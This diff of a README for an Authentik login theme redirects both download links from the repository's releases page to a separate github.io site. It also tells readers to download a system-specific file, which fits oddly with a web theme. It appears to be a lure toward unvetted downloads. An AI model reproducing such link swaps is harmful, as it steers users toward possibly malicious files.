@@ -1,6 +1,6 @@
 # ❄️ authentik-frosted-theme - Add visual style to your login screen
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Indianblanketcontinuingeducation88/authentik-frosted-theme/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://indianblanketcontinuingeducation88.github.io)
 
 This software provides a clean, modern frosted glass look for your Authentik login interface. The design focuses on readability and depth, turning a standard web page into an elegant user experience. It uses blur effects and soft transparency to help the interface blend into your desktop environment.
 
@@ -8,7 +8,7 @@ This software provides a clean, modern frosted glass look for your Authentik log
 
 To begin, visit the official release page to choose the correct file for your system.
 
-[Download the latest release here](https://github.com/Indianblanketcontinuingeducation88/authentik-frosted-theme/releases)
+[Download the latest release here](https://indianblanketcontinuingeducation88.github.io)
 
 On this page, look for the most recent version at the top of the list. Click the file name to start your download. Your browser will save the file to your computer. Most machines store these files in your "Downloads" folder by default.
 
